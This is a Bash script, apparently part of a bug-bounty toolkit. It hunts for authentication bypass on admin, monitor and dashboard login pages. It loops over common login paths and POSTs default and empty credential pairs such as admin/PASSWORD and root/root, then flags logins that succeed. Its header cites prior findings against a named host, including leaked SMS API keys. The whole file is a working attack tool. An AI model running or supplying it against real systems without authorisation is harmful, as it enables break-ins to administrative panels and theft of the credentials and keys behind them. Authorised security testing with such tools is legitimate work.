#!/usr/bin/env bash
# hunt-monitor-bypass.sh — 監控 / 管理後台 Auth Bypass 探測
# 來源：EVERY8D TP-S35/38 pattern
#   TP-S35: monitor.e8d.tw admin/PASSWORD 弱密碼 → 28 組 SMS API key
#   TP-S38: monitor.e8d.tw aid=&pwd=（空帳密）→ 302 redirect to adminMain
#
# 泛化對象：monitor.* / admin.* / manage.* / dashboard.* + 常見管理路徑
# 測試向量：空帳密、admin/PASSWORD、admin/admin、admin/空白、root/root
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../configs/tool-profiles.sh" 2>/dev/null || true

HOST="${1:-}"
[ -z "$HOST" ] && { echo "Usage: $0 <https://host>"; exit 1; }
HOST="${HOST%/}"
SLUG=$(echo "$HOST" | sed 's|https\?://||;s|[/:]|_|g')
OUT_DIR="${OUT_DIR:-./monitor_bypass_out}"
mkdir -p "$OUT_DIR"
OUT="$OUT_DIR/${SLUG}.txt"
: > "$OUT"
log(){ echo "[$(date +%H:%M:%S)] $*" | tee -a "$OUT"; }
hit(){ echo "🔴 $*" | tee -a "$OUT"; }
warn(){ echo "🟡 $*" | tee -a "$OUT"; }

UA="Mozilla/5.0 (compatible; bbflow/monitor-bypass)"

# Login endpoints to probe
LOGIN_PATHS=(
  "/login"
  "/admin/login"
  "/manage/login"
  "/dashboard/login"
  "/monitor/login"
  "/admin"
  "/login.php"
  "/login.aspx"
  "/index.php"
)

# Credential pairs: "user|pass" (empty string = empty field)
CRED_PAIRS=(
  "|"                    # empty/empty (TP-S38 pattern)
  "admin|PASSWORD"       # TP-S35 pattern
  "admin|admin"
  "admin|"
  "admin|123456"
  "root|root"
  "admin|password"
)

# Indicators of successful login (body patterns)
SUCCESS_PATTERNS=(
  "adminMain"
  "dashboard"
  "管理"
  "logout"
  "signout"
  "welcome"
  "panel"
)

log "=== monitor-bypass hunt: $HOST ==="

for PATH_EP in "${LOGIN_PATHS[@]}"; do
  URL="${HOST}${PATH_EP}"
  # Quick probe — skip if no response
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 6 "$URL" 2>/dev/null)
  [[ "$CODE" == "000" || "$CODE" == "404" ]] && continue
  log "  candidate: $URL [HTTP $CODE]"

  for CRED in "${CRED_PAIRS[@]}"; do
    USER="${CRED%%|*}"
    PASS="${CRED##*|}"

    # Try form-encoded POST
    RESP=$(curl -sk --max-time 10 -L \
      -c /tmp/bbflow_monitor_cookies_$$.txt \
      -b /tmp/bbflow_monitor_cookies_$$.txt \
      -X POST "$URL" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "User-Agent: $UA" \
      -d "aid=${USER}&pwd=${PASS}&username=${USER}&password=${PASS}&user=${USER}&pass=${PASS}" \
      -w "\n__HTTP_CODE__:%{http_code}__FINAL_URL__:%{url_effective}" 2>/dev/null)
    RCODE=$(echo "$RESP" | grep -o '__HTTP_CODE__:[0-9]*' | cut -d: -f2)
    RFINAL=$(echo "$RESP" | grep -o '__FINAL_URL__:.*' | cut -d: -f2-)
    RBODY=$(echo "$RESP" | sed 's/__HTTP_CODE__:.*//')

    # Check for success indicators
    MATCHED=""
    for PAT in "${SUCCESS_PATTERNS[@]}"; do
      if echo "$RBODY" | grep -qi "$PAT"; then
        MATCHED="$PAT"
        break
      fi
    done

    if [ -n "$MATCHED" ] || (echo "$RFINAL" | grep -qi "adminMain\|dashboard\|main\|home" 2>/dev/null); then
      hit "[P1-CRIT] monitor-bypass: $URL user='${USER}' pass='${PASS}' → matched='${MATCHED}' final=${RFINAL}"
      log "  body preview: $(echo "$RBODY" | head -c 300)"
    fi
    rm -f /tmp/bbflow_monitor_cookies_$$.txt
  done
done

log "=== done → $OUT ==="
